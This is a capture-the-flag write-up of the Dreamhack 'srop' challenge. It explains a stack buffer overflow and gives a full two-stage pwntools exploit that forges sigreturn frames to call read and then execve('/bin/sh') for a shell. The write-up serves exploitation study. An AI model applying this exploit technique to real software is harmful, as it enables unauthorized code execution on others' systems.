---
title: "[Dreamhack] srop - Sigreturn-Oriented Programming"
date: 2024-01-15 00:00:00 +0700
categories: [Dreamhack, Binary Exploitation]
tags: [pwn, srop, sigreturn, rop, nx, syscall, dreamhack]
author: datious
description: "Dreamhack writeup: srop — Sigreturn-Oriented Programming để thực thi execve('/bin/sh') khi không đủ gadgets cho ROP thông thường."
---

# [Write up for Dreamhack] Challenge: srop
**Author: datious**

## Source code

```c
// Name: srop.c
// Compile: gcc -o srop srop.c -fno-stack-protector -no-pie

#include <unistd.h>

int gadget() {
  asm("pop %rax;"
      "syscall;"
      "ret");
}

int main()
{
  char buf[16];
  read(0, buf, 1024);   // ← Buffer Overflow
}
```

The vulnerability is a **buffer overflow**. This allows hijacking program control flow.

## 1. Analyze and Gather Ingredients

**Security layers:**

![Checksec](https://hackmd.io/_uploads/rkqYSlDHGg.png)

→ **NX is enabled** — shellcode on stack won't execute.

**Key gadget found:**

```
0x00000000004004eb : pop rax ; syscall
```

**Strategy:** Leverage **SROP (Sigreturn-Oriented Programming)** to:
1. Write `/bin/sh` string into writable memory
2. Execute `execve("/bin/sh")`

> **SROP key concept:** `rt_sigreturn` (syscall #15 on x86_64) restores CPU registers from a **sigreturn frame** on the stack. We craft a fake frame to set arbitrary register values.

## 2. Exploitation Strategy

### Stage 1: Use rt_sigreturn → call `read(0, rw_memory, len(stage2))`

```python
from pwn import *

elf = ELF('./srop')
p   = process('./srop')

context.arch    = 'amd64'
context.os      = 'linux'

pop_rax_syscall = 0x00000000004004eb
syscall         = pop_rax_syscall + 1      # just the syscall instruction

# Writable memory (BSS or data segment)
rw = elf.bss()

frame1       = SigreturnFrame()
frame1.rsp   = rw + 8           # new stack in writable memory
frame1.rax   = 0                # syscall: read
frame1.rdi   = 0                # fd: stdin
frame1.rsi   = rw               # buf: writable memory
frame1.rdx   = 200              # count
frame1.rip   = syscall

stage1  = b'A' * 24             # overflow buf (16) + saved rbp (8)
stage1 += p64(pop_rax_syscall)
stage1 += p64(15)               # RAX = 15 → rt_sigreturn
stage1 += p64(syscall)          # trigger sigreturn
stage1 += bytes(frame1)

p.send(stage1)
```

### Stage 2: Send `/bin/sh` + frame2 → `execve("/bin/sh", 0, 0)`

```python
binsh = b'/bin/sh\x00'

frame2       = SigreturnFrame()
frame2.rax   = 59               # syscall: execve
frame2.rdi   = rw               # ptr to "/bin/sh"
frame2.rsi   = 0
frame2.rdx   = 0
frame2.rip   = syscall

stage2  = binsh
stage2  = stage2.ljust(8, b'\x00')
stage2 += p64(pop_rax_syscall)
stage2 += p64(15)
stage2 += p64(syscall)
stage2 += bytes(frame2)

p.send(stage2)
p.interactive()
```

## 3. Why SROP?

| Technique | Requirement |
|-----------|-------------|
| ret2libc  | Leak + enough gadgets |
| Shellcode | NX disabled |
| **SROP**  | Only needs `pop rax; syscall` ✅ |

SROP is extremely powerful when gadgets are scarce — only `pop rax; syscall` is required to completely control execution flow.
